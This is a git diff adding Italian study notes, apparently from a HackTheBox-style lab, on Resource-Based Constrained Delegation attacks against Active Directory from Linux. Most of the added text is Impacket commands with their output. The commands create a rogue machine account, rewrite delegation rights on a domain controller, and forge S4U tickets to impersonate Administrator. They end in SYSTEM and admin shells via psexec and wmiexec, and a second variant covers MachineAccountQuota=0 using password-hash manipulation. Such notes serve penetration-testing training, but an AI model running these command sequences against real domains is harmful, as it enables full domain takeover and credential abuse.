@@ -62,6 +62,8 @@
     - [Esempio RBCD su Windows](#esempio-rbcd-su-windows)
       - [Se non disponiamo di tali diritti, potremmo creare un computer fittizio.](#se-non-disponiamo-di-tali-diritti-potremmo-creare-un-computer-fittizio)
         - [Usare PowerMad per creare un computer fittizio](#usare-powermad-per-creare-un-computer-fittizio)
+      - [Esempio RBCD su Linux](#esempio-rbcd-su-linux)
+      - [RBCD da Linux quando MachineAccountQuota = 0](#rbcd-da-linux-quando-machineaccountquota--0)
     - [Esempio](#esempio)
       - [Step 1 — verifichi la configurazione RBCD su FILE-SRV](#step-1--verifichi-la-configurazione-rbcd-su-file-srv)
         - [Risolvi il SID per confermare:](#risolvi-il-sid-per-confermare)
@@ -1946,6 +1948,138 @@ VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
 VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(distinguishedname=CN=DC01,OU=Domain
 Controllers,DC=INLANEFREIGHT,DC=LOCAL)))
 VERBOSE: [Set-DomainObject] Clearing 'msDS-AllowedToActOnBehalfOfOtherIdentity' for object 'DC01$'
+```
+
+#### Esempio RBCD su Linux
+Per prima cosa, dobbiamo creare un account computer, cosa possibile perché ```ms-DS-MachineAccountQuota``` è impostato di default a 10 per gli utenti autenticati. Possiamo usare lo script addcomputer.py di Impacket.
+```
+Nanan@htb[/htb]$ addcomputer.py -computer-name 'HACKTHEBOX$' -computer-pass Hackthebox123+\! -dc-ip 10.129.205.35 inlanefreight.local/carole.holmes
+
+Impacket v0.9.22.dev1+20200520.120526.3f1e7ddd - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Successfully added machine account HACKTHEBOX$ with password Hackthebox123+!.
+```
+
+> Nota: possiamo usare BloodHound.py per enumerare il dominio e cercare privilegi sfruttabili per RBCD da Linux, ma qui usiamo lo stesso esempio della sezione precedente.
+
+
+Successivamente, dobbiamo aggiungere questo account alla lista di fiducia del computer target. Questo è possibile perché carole.holmes ha permessi ```GenericAll``` ACL su quel computer. Possiamo usare lo script Python [rbcd.py](https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py).
+
+```
+Nanan@htb[/htb]$ python3 rbcd.py -dc-ip 10.129.205.35 -t DC01 -f HACKTHEBOX inlanefreight\\carole.holmes:Y3t4n0th3rP4ssw0rd
+
+Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra
+                                                                                  
+[*] Starting Resource Based Constrained Delegation Attack against DC01$
+[*] Initializing LDAP connection to 10.129.205.35
+[*] Using inlanefreight\carole.holmes account with password ***
+[*] LDAP bind OK
+[*] Initializing domainDumper()
+[*] Initializing LDAPAttack()
+[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `HACKTHEBOX` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `DC01`
+[*] Delegation rights modified succesfully!
+[*] HACKTHEBOX$ can now impersonate users on DC01$ via S4U2Proxy
+```
+
+Ora possiamo:
+- Richiedere un TGT
+- Fare una richiesta S4U2Self
+- Fare una richiesta S4U2Proxy per ottenere un ticket valido per uno specifico servizio
+
+```
+Nanan@htb[/htb]$ getST.py -spn cifs/DC01.inlanefreight.local -impersonate Administrator -dc-ip 10.129.205.35 inlanefreight.local/HACKTHEBOX:Hackthebox123+\!
+
+Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+```
+
+Poi esportiamo il ticket:
+```
+export KRB5CCNAME=./Administrator.ccache
+```
+
+Ora possiamo usare qualsiasi tool di Impacket, ad esempio psexec.py, per ottenere una shell come SYSTEM.
+
+```
+Nanan@htb[/htb]$ psexec.py -k -no-pass dc01.inlanefreight.local
+
+Impacket v0.10.1.dev1+20230330.124621.5026d261 - Copyright 2022 Fortra
+
+[*] Requesting shares on dc01.inlanefreight.local.....
+[*] Found writable share ADMIN$
+[*] Uploading file jCXbAmVs.exe
+[*] Opening SVCManager on dc01.inlanefreight.local.....
+[*] Creating service FYxR on dc01.inlanefreight.local.....
+[*] Starting service FYxR.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.2628]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+
+#### RBCD da Linux quando MachineAccountQuota = 0
+Se non possiamo creare un account computer o non esiste uno SPN, possiamo comunque eseguire l’attacco con un metodo scoperto da [James Forshaw](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html).
+
+Convertiamo la password in hash NT con pypykatz:
+```
+Nanan@htb[/htb]$ pypykatz crypto nt 'B3thR!ch@rd$'
+de3d16603d7ded97bb47cd6641b1a392
+```
+
+Richiediamo il TGT:
+```
+Nanan@htb[/htb]$ getTGT.py INLANEFREIGHT.LOCAL/beth.richards -hashes :de3d16603d7ded97bb47cd6641b1a392 -dc-ip 10.129.205.35
+Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in beth.richards.ccache
+```
+
+Otteniamo la session key del ticket. Questa chiave è fondamentale per i passaggi successivi, poiché consente di trasmettere la chiave di sessione del TGT corrente come nuovo hash NT.
+```
+Nanan@htb[/htb]$ describeTicket.py beth.richards.ccache | grep 'Ticket Session Key'
+[*] Ticket Session Key            : 7c3d8b8b135c7d574e423dcd826cab58
+```
+Conoscendo la chiave di sessione del TGT, possiamo modificare la password dell'utente sul controller di dominio tra le richieste S4U2Self e S4U2Proxy. Ciò comporta l'utilizzo del metodo SamrChangePasswordUser per impostare la password dell'utente in modo che corrisponda alla chiave di sessione del TGT, consentendo al KDC di decrittografare il ticket. Per modificare la password dell'utente in modo che corrisponda alla chiave di sessione, possiamo utilizzare changepasswd.py:
+```
+Nanan@htb[/htb]$ changepasswd.py INLANEFREIGHT.LOCAL/beth.richards@10.129.205.35 -hashes :de3d16603d7ded97bb47cd6641b1a392 -newhash :7c3d8b8b135c7d574e423dcd826cab58
+Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Changing the password of INLANEFREIGHT.LOCAL\beth.richards
+[*] Connecting to DCE/RPC as INLANEFREIGHT.LOCAL\beth.richards
+[*] Password was changed successfully.
+[!] User will need to change their password on next logging because we are using hashes.
+```
+
+Infine, utilizza la delega configurata per assumere l'identità di un utente con privilegi elevati e richiedere un ticket di servizio per il servizio desiderato, come CIFS o LDAP, sul computer di destinazione:
+```
+Nanan@htb[/htb]$ KRB5CCNAME=beth.richards.ccache getST.py -u2u -impersonate Administrator -spn TERMSRV/DC01.INLANEFREIGHT.LOCAL -no-pass INLANEFREIGHT.LOCAL/beth.richards -dc-ip 10.129.205.35
+Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Impersonating Administrator
+[*] Requesting S4U2self+U2U
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@TERMSRV_DC01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache
+```
+
+Con il nuovo ticket, possiamo connetterci al controller di dominio come amministratore:
+```
+Nanan@htb[/htb]$ KRB5CCNAME=Administrator@TERMSRV_DC01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache wmiexec.py DC01.INLANEFREIGHT.LOCAL -k -no-pass
+Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>hostname
+DC01
 ```
 
 
